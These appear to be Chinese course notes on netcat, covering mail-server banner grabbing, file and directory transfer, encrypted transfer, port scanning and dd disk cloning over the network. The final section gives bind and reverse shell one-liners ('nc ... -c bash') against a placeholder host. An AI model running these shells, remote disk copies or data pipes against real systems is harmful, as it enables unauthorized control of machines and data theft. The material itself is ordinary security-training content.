        <h3 id="nc命令使用方法"><a href="#nc命令使用方法" class="headerlink" title="nc命令使用方法"></a>nc命令使用方法</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">* 将nc命令当telnet使用</span><br><span class="line">语法：</span><br><span class="line">nc -nv IP PORT</span><br><span class="line">例：</span><br><span class="line">mtr 202.106.0.20</span><br><span class="line"><span class="meta">#</span><span class="bash"> 使用mtr命令追踪一下路由</span></span><br><span class="line">nc -nv 123.125.50.29 110</span><br><span class="line"><span class="meta">#</span><span class="bash"> -n表示不使用DNS解析(不建议在nc后使用域名)；-v表示显示详细信息。连接163邮箱服务器。进入后可以使用一些命令，但识别的都是base64加密后的数据</span></span><br><span class="line">base64</span><br><span class="line">	zheng.yao@ccgoldenet.com</span><br><span class="line"><span class="meta">#</span><span class="bash"> 输入base64命令后按回车，之后等待输入数据，输入完成后按回车再按Ctrl+d结束，就会产生一个base64编码后的数据</span></span><br><span class="line">nc -vn 123.125.50.138 25</span><br><span class="line"><span class="meta">#</span><span class="bash"> 连接163的smtp服务器。</span></span><br><span class="line">nc -vn 1.1.1.1 80</span><br><span class="line"><span class="meta">#</span><span class="bash"> 连接后都会提示端口的状态，如open表示打开状态</span></span><br><span class="line">	head /</span><br><span class="line"><span class="meta">#</span><span class="bash"> 进入后，可以用head请求头信息</span></span><br><span class="line"></span><br><span class="line">* 使用NC传输文本信息</span><br><span class="line">A：nc -l -p 333</span><br><span class="line"><span class="meta">#</span><span class="bash"> -l(listen)表示要监听端口，-p指定端口号。这可以起到一个服务端的功能</span></span><br><span class="line">B：nc -nv 1.1.1.1 333</span><br><span class="line"><span class="meta">#</span><span class="bash"> 连接后，这两台主机就可以聊天了。</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 这个功能不为聊天，实际是为电子取证所用</span></span><br><span class="line"></span><br><span class="line">A：nc -l -p 333</span><br><span class="line">B：ls -l | nc -nv 1.1.1.1 333</span><br><span class="line"><span class="meta">#</span><span class="bash"> 将本机ls -l显示的信息传到nc服务器上。这是远程电子审计的标准方法</span></span><br><span class="line"></span><br><span class="line">A：nc -l -p 333 &gt; ps.txt</span><br><span class="line"><span class="meta">#</span><span class="bash"> 将结果重定向到一个文件中</span></span><br><span class="line">B：ps aux|nc -nv 1.1.1.1 333 -q 1</span><br><span class="line"><span class="meta">#</span><span class="bash"> 收集进程信息。-q表示标准结果输出后，delay（延迟）一定时间就退出。1就是延迟的时间，表示1秒</span></span><br><span class="line">A： cat ps.txt</span><br><span class="line"></span><br><span class="line">A：nc -l -p 333 &gt; lsof.txt</span><br><span class="line">B：lsof | nc -nv 1.1.1.1 333 -q 1</span><br><span class="line">A： cat lsof.txt</span><br><span class="line"></span><br><span class="line">* 使用NC传输文件/目录</span><br><span class="line">** 传输文件</span><br><span class="line">A：nc -lp 333 &gt; 1.mp4</span><br><span class="line"><span class="meta">#</span><span class="bash"> 接收端打开333端口，接收到的内容输入到一个文件名</span></span><br><span class="line">B：nc -nv 1.1.1.1 333 &lt; 1.mp4 -q 1</span><br><span class="line"><span class="meta">#</span><span class="bash"> 发送文件到接收端</span></span><br><span class="line">或</span><br><span class="line">A：nc -q 1 -lp 333 &lt; a.mp4</span><br><span class="line"><span class="meta">#</span><span class="bash"> 从服务器向客户端收送文件，这就成了发送端。这像是一个下载的过程。连接完成后1秒断开</span></span><br><span class="line">B：nc -nv 1.1.1.1 333 &gt; 2.mp4</span><br><span class="line"><span class="meta">#</span><span class="bash"> 客户端成了接收端。</span></span><br><span class="line"></span><br><span class="line">** 传输目录</span><br><span class="line">A：tar -cvf - music/ | nc -lp 333 -q 1</span><br><span class="line"><span class="meta">#</span><span class="bash"> 打包目录，通过管道入到nc中。视频中强调，cvf后面的横线不能少，少了就不能打包成tar文件了。在 GNU 指令中，如果单独使用 - 符号，不加任何该加的文件名称时，代表<span class="string">"标准输入"</span>的意思。这是 GNU指令的共通选项。如：tar xpvf -，这里的 - 符号，既代表从标准输入读取资料。不过，在 <span class="built_in">cd</span> 指令中则比较特别，<span class="built_in">cd</span> -，这代表变更工作目录到<span class="string">"上一次"</span>工作目录。</span></span><br><span class="line">B：nc -nv 1.1.1.1 333 |tar -xvf -</span><br><span class="line"><span class="meta">#</span><span class="bash"> 连接到nc，将打包的目录解压到本地</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 也可以反方向传输。</span></span><br><span class="line"></span><br><span class="line">** 加密传文件</span><br><span class="line">A：nc -lp 333 | mcrypt --flush -Fbqd -a rijindael-256 -m ecb &gt; 1.mp4</span><br><span class="line"><span class="meta">#</span><span class="bash"> A端先监听端口，等待别人给其传文件。收到文件后给后面的解密命令解密，之后重新输出一个文件。接收到文件后会提示输入密码</span></span><br><span class="line">B：mcrypt --flush -Fbq -a rijindael-256 -m ecb &lt; a.mp4 | nc -nv 1.1.1.1 333 -q 1</span><br><span class="line"><span class="meta">#</span><span class="bash"> 将加密文件转给A主机。两边的加密方式应该一致。加密时需要输入两次密码</span></span><br><span class="line"></span><br><span class="line">* 使用NC做流媒体服务</span><br><span class="line">A： cat 1.mp4 | nc -lp 333</span><br><span class="line"><span class="meta">#</span><span class="bash"> mp4文件也可以用cat打开</span></span><br><span class="line">B：nc -nv 1.1.1.1 333 | mplayer -vo x11 -cache 3000 -</span><br><span class="line"><span class="meta">#</span><span class="bash"> mplayer是一个播放器，其他支持命令行的播放器也可以</span></span><br><span class="line"></span><br><span class="line">* 使用NC做端口扫描</span><br><span class="line">nc -nvz 1.1.1.1 1-65535</span><br><span class="line">nc -nvzu 1.1.1.1 1-1024</span><br><span class="line"><span class="meta">#</span><span class="bash"> -z表示使用0输入/输出模式，只在扫描通信端口时使用。默认使用tcp端口，-u表示扫描udp的端口。每一个扫描器扫描的结果都不是完全准确的，可能被防火墙拦截。建议使用多个工具进行扫描</span></span><br><span class="line"></span><br><span class="line">* 使用NC做远程克隆硬盘</span><br><span class="line">A：nc -lp 333 | dd of=/dev/sda</span><br><span class="line">B：dd if=/dev/sda | nc -nv 1.1.1.1 333 -q 1</span><br><span class="line"><span class="meta">#</span><span class="bash"> 远程电子取证，可以将目标服务器硬盘远程复制，或者内存。这是块级别的备份。不会只拷贝文件，它会将磁盘扇区上的所有数据都拷贝过来。dd命令就是块级别的复制。<span class="keyword">if</span>表示input file</span></span><br><span class="line"></span><br><span class="line">* 使用NC做远程控制</span><br><span class="line">** 正向</span><br><span class="line">A： nc -lp 333 -c bash</span><br><span class="line">B： nc -nv 1.1.1.1 333</span><br><span class="line"><span class="meta">#</span><span class="bash"> 客户端控制服务器。连接后可以使用bash命令</span></span><br><span class="line"></span><br><span class="line">** 反向</span><br><span class="line">A：nc -lp 333</span><br><span class="line">B：nc -nv 1.1.1.1 333 -c bash</span><br><span class="line"><span class="meta">#</span><span class="bash"> 服务器控制客户端</span></span><br><span class="line"></span><br><span class="line">注：windows用户把bash改成cmd</span><br><span class="line"></span><br><span class="line">* NC-NCAT</span><br><span class="line">NC缺乏加密和身份验证的能力</span><br><span class="line">NCAT包含于nmap工具包中。NCAT与NC是不一样的</span><br><span class="line">A：ncat -c bash --allow 1.1.1.1 -vnl 333 --ssl</span><br><span class="line"><span class="meta">#</span><span class="bash"> --allow表示允许哪个IP地址来连接本服务器</span></span><br><span class="line">B：ncat -nv 1.1.1.1 333 --ssl；监听的是333端口，--ssl表示ssl加密</span><br><span class="line"><span class="meta">#</span><span class="bash"> 不同系统/平台的NC参数功能不尽相同</span></span><br></pre></td></tr></table></figure>
